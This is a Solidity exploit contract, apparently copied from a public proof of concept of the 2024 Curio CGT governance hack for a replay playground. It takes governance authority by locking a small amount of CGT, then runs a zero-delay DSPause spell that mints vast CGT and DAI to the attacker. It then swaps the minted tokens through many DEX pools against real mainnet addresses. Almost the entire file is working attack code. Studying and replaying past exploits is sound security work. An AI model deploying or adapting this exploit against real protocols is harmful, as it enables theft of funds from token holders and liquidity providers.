// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2024-03-CGT).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (attacker = address(this); `attack()` is a plain method on the
// test harness, not a standalone exploit contract). This is a faithful,
// self-contained copy of that inline attack (attack + _swap0 + _swap1 +
// the Spell helper) so the playground can deploy it and record run().
// Logic and constants are copied verbatim from test/CGT_exp.sol.
//
// Root cause: Curio wired DSChief-style governance (voting weight backed by
// the illiquid CGT token) into a MakerDAO DSPause timelock that is `auth` on
// both DSToken.mint and MakerDAO's Vat.suck. Locking ~20 CGT buys the `hat`
// (governance authority); a zero-delay `plot`+`exec` in the same tx then runs
// an arbitrary spell as that authority, minting 1e30 CGT and 1e27 (RAD-scaled)
// DAI directly to the attacker.

interface IERC20Min {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IMERC20 is IERC20Min {
    function mint(address guy, uint256 wad) external;
}

interface IDSChief {
    function lock(uint256 wad) external;
    function vote(address[] memory yays) external returns (bytes32);
    function lift(address whom) external;
}

interface IDSPause {
    function plot(address usr, bytes32 tag, bytes memory fax, uint256 eta) external;
    function exec(address usr, bytes32 tag, bytes memory fax, uint256 eta) external returns (bytes memory out);
}

interface IVat {
    function suck(address u, address v, uint256 rad) external;
    function hope(address usr) external;
}

interface IJoin {
    function exit(address usr, uint256 wad) external;
}

interface IRouterV3s {
    struct ExactInputParams {
        bytes path;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
    }

    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external returns (uint256[] memory amounts);
    function exactInput(ExactInputParams calldata params) external payable returns (uint256 amountOut);
}

contract CGTDrain {
    IDSChief constant chief = IDSChief(0x579A3244f38112b8AAbefcE0227555C9b6e7aaF0);
    IDSPause constant pause = IDSPause(0x1e692eF9cF786Ed4534d5Ca11EdBa7709602c69f);
    IERC20Min constant csc = IERC20Min(0xfDcdfA378818AC358739621ddFa8582E6ac1aDcB);
    IERC20Min constant ixs = IERC20Min(0x73d7c860998CA3c01Ce8c808F5577d94d545d1b4);
    IERC20Min constant oinch = IERC20Min(0x111111111117dC0aa78b770fA6A738034120C302);
    IERC20Min constant uni = IERC20Min(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984);
    IERC20Min constant link = IERC20Min(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    IERC20Min constant xchf = IERC20Min(0xB4272071eCAdd69d933AdcD19cA99fe80664fc08);
    IERC20Min constant skl = IERC20Min(0x00c83aeCC790e8a4453e5dD3B0B4b3680501a7A7);
    IERC20Min constant weth = IERC20Min(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20Min constant dai = IERC20Min(0x6B175474E89094C44Da98b954EedeAC495271d0F);
    IMERC20 constant cgt = IMERC20(0xF56b164efd3CFc02BA739b719B6526A6FA1cA32a);
    IRouterV3s constant router = IRouterV3s(0xDc6844cED486Ec04803f02F2Ee40BBDBEf615f21);
    IRouterV3s constant routerV3 = IRouterV3s(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    Spell public spell;

    // step 0-6: buy the DSChief `hat` for ~20 CGT, then plot+exec a zero-delay
    // spell that mints 1e30 CGT + 1e27 RAD of DAI straight to this contract.
    function run() external {
        cgt.approve(address(chief), type(uint256).max);
        chief.lock(20 ether);
        address[] memory yays = new address[](1);
        yays[0] = address(this);
        chief.vote(yays);
        chief.lift(address(this));

        spell = new Spell();
        address spelladdr = address(spell);
        bytes32 tag;
        assembly {
            tag := extcodehash(spelladdr)
        }
        uint256 delay = block.timestamp + 0;
        bytes memory sig = abi.encodeWithSignature("act(address,address)", address(this), address(cgt));
        pause.plot(address(spell), tag, sig, delay);
        pause.exec(address(spell), tag, sig, delay);

        _swap0();
        _swap1();
    }

    // step 7-16: launder freshly-minted CGT (and related CSC) through 8 Curio
    // DEX pairs + a Uniswap V3 hop — this is exit liquidity, not the bug.
    function _swap0() internal {
        uint256 inAmount = 10 ** 8 * 1 ether;
        address[] memory path = new address[](2);
        path[0] = address(cgt);
        path[1] = address(weth);

        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path, address(this), block.timestamp);

        path[1] = address(dai);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path, address(this), block.timestamp);

        path[1] = address(xchf);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path, address(this), block.timestamp);

        path[1] = address(oinch);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path, address(this), block.timestamp);

        path[1] = address(uni);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path, address(this), block.timestamp);

        path[1] = address(link);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path, address(this), block.timestamp);

        path[1] = address(skl);
        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path, address(this), block.timestamp);

        path[0] = address(csc);
        path[1] = address(weth);
        csc.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path, address(this), block.timestamp);

        address[] memory path3 = new address[](3);
        path3[0] = address(cgt);
        path3[1] = address(0x46683747B55C4A0fF783B1A502cE682eB819eb75);
        path3[2] = address(ixs);

        cgt.approve(address(router), inAmount);
        router.swapExactTokensForTokens(inAmount, 0, path3, address(this), block.timestamp);

        cgt.approve(address(routerV3), cgt.balanceOf(address(this)));
        bytes memory pathv3 = abi.encodePacked(address(cgt), uint24(10_000), address(weth));
        IRouterV3s.ExactInputParams memory params = IRouterV3s.ExactInputParams({
            path: pathv3,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: inAmount,
            amountOutMinimum: 0
        });

        routerV3.exactInput(params);
    }

    function _swap1() internal {
        xchf.approve(address(routerV3), xchf.balanceOf(address(this)));
        bytes memory path = abi.encodePacked(address(xchf), uint24(3000), address(weth), uint24(3000), address(dai));
        IRouterV3s.ExactInputParams memory params = IRouterV3s.ExactInputParams({
            path: path,
            recipient: address(this),
            deadline: block.timestamp,
            amountIn: xchf.balanceOf(address(this)),
            amountOutMinimum: 0
        });

        routerV3.exactInput(params);

        oinch.approve(address(routerV3), oinch.balanceOf(address(this)));
        path = abi.encodePacked(address(oinch), uint24(3000), address(weth), uint24(3000), address(dai));
        params.path = path;
        params.amountIn = oinch.balanceOf(address(this));

        routerV3.exactInput(params);

        uni.approve(address(routerV3), uni.balanceOf(address(this)));
        path = abi.encodePacked(address(uni), uint24(3000), address(weth), uint24(3000), address(dai));
        params.path = path;
        params.amountIn = uni.balanceOf(address(this));

        routerV3.exactInput(params);

        link.approve(address(routerV3), link.balanceOf(address(this)));
        path = abi.encodePacked(address(link), uint24(3000), address(weth), uint24(3000), address(dai));
        params.path = path;
        params.amountIn = link.balanceOf(address(this));

        routerV3.exactInput(params);
    }

    fallback() external payable {}
}

// The malicious spell run through DSPause once the attacker controls the
// `hat` — this is the actual privilege-escalation payload.
contract Spell {
    function act(address user, IMERC20 cgt) public {
        IVat vat = IVat(0x8B2B0c101adB9C3654B226A3273e256a74688E57);
        IJoin daiJoin = IJoin(0xE35Fc6305984a6811BD832B0d7A2E6694e37dfaF);

        vat.suck(address(this), address(this), 10 ** 9 * 10 ** 18 * 10 ** 27);

        vat.hope(address(daiJoin));
        daiJoin.exit(user, 10 ** 9 * 1 ether);

        cgt.mint(user, 10 ** 12 * 1 ether);
    }
}
